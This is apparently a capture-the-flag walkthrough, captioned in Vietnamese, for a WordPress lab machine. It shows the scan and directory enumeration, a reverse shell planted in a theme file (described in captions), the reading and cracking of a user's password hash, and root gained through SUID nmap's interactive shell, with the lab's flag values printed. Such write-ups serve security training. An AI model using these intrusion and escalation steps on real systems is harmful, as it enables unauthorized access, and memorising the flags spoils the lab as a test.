```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.113.147.189  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-28 22:56 EDT
Nmap scan report for 10.113.147.189
Host is up (0.26s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:7d:7c:d9:de:20:aa:c5:e9:18:a6:6f:ce:42:85:e9 (RSA)
|   256 1d:62:78:33:93:93:32:a9:90:76:07:25:fb:24:dd:f6 (ECDSA)
|_  256 75:5b:1a:ea:9b:db:c1:2e:24:12:83:f5:da:82:34:a2 (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.76 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.113.147.189 -w /usr/share/wordlists/dirb/common.txt -t 2 -x php,txt,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.147.189
[+] Method:                  GET
[+] Threads:                 2
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.hta.txt             (Status: 403) [Size: 217]
/.hta.php             (Status: 403) [Size: 217]
/.htaccess            (Status: 403) [Size: 218]
/.hta.js              (Status: 403) [Size: 216]
/.htaccess.php        (Status: 403) [Size: 222]
/.htaccess.txt        (Status: 403) [Size: 222]
/.htaccess.js         (Status: 403) [Size: 221]
/.htpasswd            (Status: 403) [Size: 218]
/.htpasswd.php        (Status: 403) [Size: 222]
/.htpasswd.txt        (Status: 403) [Size: 222]
/.htpasswd.js         (Status: 403) [Size: 221]
/0                    (Status: 301) [Size: 0] [--> http://10.113.147.189/0/]
/admin                (Status: 301) [Size: 236] [--> http://10.113.147.189/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/atom/]
/audio                (Status: 301) [Size: 236] [--> http://10.113.147.189/audio/]
/blog                 (Status: 301) [Size: 235] [--> http://10.113.147.189/blog/]
/css                  (Status: 301) [Size: 234] [--> http://10.113.147.189/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.113.147.189/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.113.147.189/image/]
/Image                (Status: 301) [Size: 0] [--> http://10.113.147.189/Image/]
/images               (Status: 301) [Size: 237] [--> http://10.113.147.189/images/]
/index.php            (Status: 301) [Size: 0] [--> http://10.113.147.189/]
/index.html           (Status: 200) [Size: 1104]
/index.php            (Status: 301) [Size: 0] [--> http://10.113.147.189/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 233] [--> http://10.113.147.189/js/]
/license              (Status: 200) [Size: 309]
/license.txt          (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.113.147.189/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.113.147.189/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 236] [--> http://10.113.147.189/video/]
/wp-admin             (Status: 301) [Size: 239] [--> http://10.113.147.189/wp-admin/]
/wp-app.php           (Status: 403) [Size: 0]
/wp-atom.php          (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/atom/]
/wp-commentsrss2.php  (Status: 301) [Size: 0] [--> http://10.113.147.189/comments/feed/]
/wp-config            (Status: 200) [Size: 0]
/wp-config.php        (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 241] [--> http://10.113.147.189/wp-content/]
/wp-cron              (Status: 200) [Size: 0]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-feed.php          (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/wp-includes          (Status: 301) [Size: 242] [--> http://10.113.147.189/wp-includes/]
/wp-links-opml.php    (Status: 200) [Size: 227]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load.php          (Status: 200) [Size: 0]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2678]
/wp-login.php         (Status: 200) [Size: 2678]
/wp-mail              (Status: 500) [Size: 3074]
/wp-mail.php          (Status: 500) [Size: 3025]
/wp-rdf.php           (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/rdf/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://10.113.147.189/wp-login.php?action=register]
/wp-rss.php           (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://10.113.147.189/feed/]
/wp-settings          (Status: 500) [Size: 0]
/wp-settings.php      (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.113.147.189/wp-login.php?action=register]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.113.147.189/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

```

<img width="513" height="137" alt="image" src="https://github.com/user-attachments/assets/23d252c4-6f9f-41f5-91d3-6f7a5bee641f" />

<img width="555" height="121" alt="image" src="https://github.com/user-attachments/assets/fafc0e84-350e-4114-8ffb-55b6590a291b" />

<img width="675" height="352" alt="image" src="https://github.com/user-attachments/assets/5f456e66-8d06-4e4c-bf8d-0857835b9b94" />

<img width="555" height="218" alt="image" src="https://github.com/user-attachments/assets/9b128d18-4a56-4732-ae88-406dee562977" />

<img width="548" height="597" alt="image" src="https://github.com/user-attachments/assets/07678c6f-96d3-480c-9484-118a5faaa468" />

<img width="967" height="801" alt="Screenshot_2026-07-28_23_09_50" src="https://github.com/user-attachments/assets/cde52273-268a-4beb-876d-27a9f554f536" />

Chon `content.php` de tai reverse shell

<img width="958" height="799" alt="Screenshot_2026-07-28_23_16_51" src="https://github.com/user-attachments/assets/65f1d6fb-b4da-4ecd-8a20-29f3c75e29f4" />

<img width="697" height="728" alt="image" src="https://github.com/user-attachments/assets/e73394fd-2765-4aee-8a73-e8ff5e1b85aa" />

Copy va Paste phan reverse shell vao trong `content.php`

<img width="961" height="799" alt="Screenshot_2026-07-28_23_19_20" src="https://github.com/user-attachments/assets/ea49a7e3-7aa0-4805-b391-af2b44415ec8" />

Upload noi dung vua paste

<img width="533" height="120" alt="image" src="https://github.com/user-attachments/assets/718e2384-388c-4445-971e-1d2f27bf3ad0" />

<img width="548" height="87" alt="image" src="https://github.com/user-attachments/assets/eaa4869a-0a3b-4bd6-9c62-05e1a9d5d7e5" />

<img width="942" height="212" alt="image" src="https://github.com/user-attachments/assets/592e5d63-4318-49a6-97c5-eef8e955be3c" />

```
$ whoami
daemon
```

```
$ cd /home
$ ls
robot
ubuntu
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
<img width="838" height="417" alt="image" src="https://github.com/user-attachments/assets/5c8a1d20-b6e9-4670-a620-6f65195088bf" />

```
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
whoami
robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

```
$ find / -perm -04000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
$ /usr/local/bin/nmap
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
cd /root
ls
firstboot_done
key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
